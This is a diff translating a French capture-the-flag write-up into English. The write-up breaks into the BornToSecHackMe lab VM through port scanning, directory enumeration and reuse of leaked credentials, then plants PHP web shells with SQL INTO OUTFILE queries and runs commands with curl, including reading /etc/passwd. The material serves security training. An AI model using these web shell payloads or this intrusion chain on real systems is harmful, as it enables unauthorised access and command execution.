@@ -1,8 +1,8 @@
 # WRITEUP1
 
-Après installation et lancement de la VM, on nous demande un mot de passe et l'adresse ip de la machine n'est pas indiqué.
-On cherche a scanner un port ouvert part notre vm, pour cela, on configure le réseau de notre vm (sur VM box) en accès par pont.
-On cherche à trouver une potentiel adresse ip créé par la VM  :
+After installing and launching the VM, we are asked for a password and the machine's ip address is not indicated.
+We are looking to scan an open port from our vm, for that, we configure the network of our vm (on VM box) in bridge access.
+We are trying to find a potential ip address created by the VM:
 
 ```bash
 λ arp -a
@@ -33,11 +33,10 @@ Interface : 192.168.1.26 --- 0x8
   ...
 
 ```
+We can also find the ip address directly in the router's configs.
 
-On peut également trouver l'adrese ip directement dans les configs du routeur.
-
-On cherche maintenant a tester les différentes adresses de type `dynamique` avec la commande ping.
-Plusieurs adresses répondes, on peut les essayer une part une avec `nmap` :
+Now, we try to test the `dynamic` type addresses with the `ping` command.
+Several addresses send back a `pong`, we can try them one by one with `nmap` to see if anything is up on those:
 
 ```bash
 λ nmap 192.168.1.22 
@@ -61,11 +60,11 @@ PORT    STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds
 ```
 
-L'adresse `192.168.1.22` dispose d'un site web qui nous affiche une page avec ecrit `HACK ME`. Après différents tests et quelques recherche on trouve différents moyen de découvrir des fails et d'autres pages accessibles.
+The address `192.168.1.22` has a website that shows us a page with` HACK ME` written in it. After various tests and some research we finded different ways to discover other accessible pages.
+  
+We used `web scanners` `Arachni`, `dirb` and`nikto`, all present by default on the `kali` OS.
 
-Nous avons utilisez les `web scanner` `Arachni`, `dirb` et `nikto`, tous présent par défault sur l'os `kali` .
-
-Nous allons travailler avec l'os `Kali` sur `wsl` à partir de maintenant car celui-ci inclut la plupart des outils de `Pen Testing` dont nous aurons besoin par la suite .
+We will be working with the `Kali` OS on`wsl` from now on because it includes most of the `Pen Testing` tools that we will need later.
 
 ```bash
 └─$ dirb https://192.168.1.22/
@@ -91,8 +90,8 @@ GENERATED WORDS: 4612
 ==> DIRECTORY: https://192.168.1.22/webmail/
 ```
 
-Grace a ces `web scanner` on identifie de nouvelles pages accessibles : `/forum`, `/phpmyadmin`, `/webmail`.
-Dans le post `Probleme login?` du forum, on peut voir des tentatives de connections avec différents nom d'user et ce qui ressemble a un mot de passe :
+  
+Thanks to these `web scanners` we identify new accessible pages:`/forum`, `/phpmyadmin`,`/webmail`. In the forum post `Login problem?`, We can see connection attempts with different usernames and what looks like a password:
 
 ```bash
 Oct 5 08:45:29 BornToSecHackMe sshd\[7547\]: Failed password for invalid user !q\\\]Ej?\*5K5cy\*AJ from 161.202.39.38 port 57764 ssh2  
@@ -100,8 +99,8 @@ Oct 5 08:45:29 BornToSecHackMe sshd\[7547\]: Received disconnect from 161.202.39
 Oct 5 08:46:01 BornToSecHackMe CRON\[7549\]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
 ```
 
-On reussi a se logger avec le nom d'user `lmezard` et le mot de passe `!q\\\]Ej?\*5K5cy\*AJ` au forum. Sur le profil de l'utilisateur on obtien l'adresse email de l'user : `laurie@borntosec.net`. On essaye de se logger sur `http://192.168.1.22/webmail` avec l'addresse email et le précédent mot de passe. On se connecte.
-Un des emails de l'utilisateur nous donne un accès à la page `phpmyadmin` :  
+We managed to log in with the username `lmezard` and the password `!q\\\]Ej?\*5K5cy\*AJ` to the forum. On the user's profile we can get the user's email address: `laurie@borntosec.net`. We try to log into `http://192.168.1.22/webmail` with the email address and the previous password. We connect successfully.
+One of the user's emails gives us access to the `phpmyadmin` page:
 
 ```
 Hey Laurie,
@@ -114,7 +113,7 @@ Best regards.
 phpmyadmin user: `root`
 phpmyadmin password: `Fg-'kKXBj87E:aJ$`
 
-Maintenant que l'on a un accès root à la db SQL, on cherche a faire une exploit appelé `web shell`. Grâce a `dirb` on peut obtenir une liste des dossiers utilisés par le site: 
+Now that we have root access to the SQL database, we are trying to do an exploit called `web shell`. Thanks to `dirb` we can obtain a list of the directories used by the site:
 
 ```bash
 └─$ dirb https://192.168.1.22/forum/
@@ -137,37 +136,38 @@ Maintenant que l'on a un accès root à la db SQL, on cherche a faire une exploi
 ==> DIRECTORY: https://192.168.1.22/webmail/themes/
 ```
 
-On cherche a obtenir le dossier par default du serveur web :
+We are trying to get the default folder from the web server:
 
 ```bash
 └─$ whatweb https://192.168.1.22/
 https://192.168.1.22/ [404 Not Found] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[192.168.1.22], Title[404 Not Found]
 ```
-Le serveur tourne sur Apache 2 donc `/var/www` pour le dossier par default.
+The server is running on Apache 2 so `/var/www` should be the default folder.
 
-On cherche a créé une nouvelle page qui nous permettera d'utiliser le `shell`. Pour cela on utilise la commande `
-SELECT "<? system($_REQUEST['cmd']); ?>",2,3,4 INTO OUTFILE "/var/www/{folder}/{filename}.php" -- 1` avec les différents dossiers disponible pour en trouver un avec les droits d'écriture. On arrive a écrire notre fichier dans le dossier `templates_c`.
+We try to create a new page that will allow us to use the `shell`. For that we use the command `SELECT "<? system($_REQUEST['cmd']); ?>",2,3,4 INTO OUTFILE "/var/www/{folder}/{filename}.php" -- 1`
+with the different folders available to find one with write rights. We manage to write our file in the `templates_c` folder.
 
-La requete sql pour créé notre fichier web_shell:
+The sql request to create our `web_shell` file:
 
 ```sql
 SELECT "<html><body><pre><form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><?php if(isset($_GET['cmd'])){echo 'Shell: ';system($_GET['cmd']);}?></pre></body></html>" INTO OUTFILE '/var/www/forum/templates_c/web_shell.php'
 ```
 
-une option simplifier sans le html pour curl :
+a simplify option without the `html` for `curl`:
 
 ```sql
 SELECT "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>" INTO OUTFILE '/var/www/forum/templates_c/curl_shell.php'
 ```
 
-On recupère le nom de notre utilisateur:
+We retrieve the name of our user:
 
 ```bash
 └─$ curl -k https://192.168.1.22/forum/templates_c/curl_shell.php?cmd=whoami
 www-data
 ```
 
-On liste les autres users:
+We list the other users:
+
 ```bash
 └─$ curl -k https://192.168.1.22/forum/templates_c/curl_shell.php?cmd=cat+/etc/passwd
 root:x:0:0:root:/root:/bin/bash
